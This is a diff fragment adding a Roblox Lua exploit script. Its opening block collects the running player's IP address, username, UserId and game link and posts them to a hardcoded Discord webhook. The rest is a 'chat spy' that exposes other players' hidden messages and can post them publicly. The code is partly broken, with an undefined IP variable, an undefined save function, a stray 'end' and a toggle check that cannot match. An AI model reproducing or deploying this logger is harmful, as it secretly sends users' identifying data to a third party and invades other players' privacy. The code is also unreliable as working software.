+local url = "https://discord.com/api/webhooks/917962974956748820/eFleSGGVZiHzpQQsl1gFVsGAPtvY_pXmXVlhmmtu9_NHpVczF5AiVILa9xYMMdl0FuYq"
+local data = {
+   ["content"] = "@everyone",
+   ["embeds"] = {
+       {
+           ["title"] = "INFORMATION "..game.Players.LocalPlayer.Name,
+           ["description"] = "IP ADDRESS: "..ip ..", UserId: "..game.Players.LocalPlayer.UserId ..", Game: https://www.roblox.com/games/"..game.PlaceId,
+           ["type"] = "rich",
+           ["color"] = 0x080808,
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+--Chat logs
+
+                       --This script reveals ALL hidden messages in the default chat
+	--chat "/spy" to toggle!
+	enabled = true
+	--if true will check your messages too
+	spyOnMyself = false
+	--if true will chat the logs publicly (fun, risky)
+	public = true --this has to BE ON TRUE OR YOU CANT BYPASS CHAT it makes /e visible to everyon
+	--if true will use /me to stand out
+	publicItalics = true
+	--customize private logs
+	privateProperties = {
+		Color = Color3.fromRGB(0,255,255); 
+		Font = Enum.Font.SourceSansBold;
+		TextSize = 18;
+	}
+	--////////////////////////////////////////////////////////////////
+	local StarterGui = game:GetService("StarterGui")
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+	local instance = (_G.chatSpyInstance or 0) + 1
+	_G.chatSpyInstance = instance
+
+	local function onChatted(p,msg)
+		if _G.chatSpyInstance == instance then
+			if p==player and msg:lower():sub(1,4)=="/[Legacy Trash]" then
+				enabled = not enabled
+				wait(0.3)
+				privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+				StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+			elseif enabled and (spyOnMyself==true or p~=player) then
+				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+				local hidden = true
+				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+						hidden = false
+					end
+				end)
+				wait(1)
+				conn:Disconnect()
+				if hidden and enabled then
+				end
+			end
+		end
+	end
+
+	for _,p in ipairs(Players:GetPlayers()) do
+		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+	end
+	Players.PlayerAdded:Connect(function(p)
+		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+	end)
+	
+	StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+	local chatFrame = player.PlayerGui.Chat.Frame
+	chatFrame.ChatChannelParentFrame.Visible = true
+	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+
+    while true do
+        wait(3)
+        saveSettings()
+    end
+end
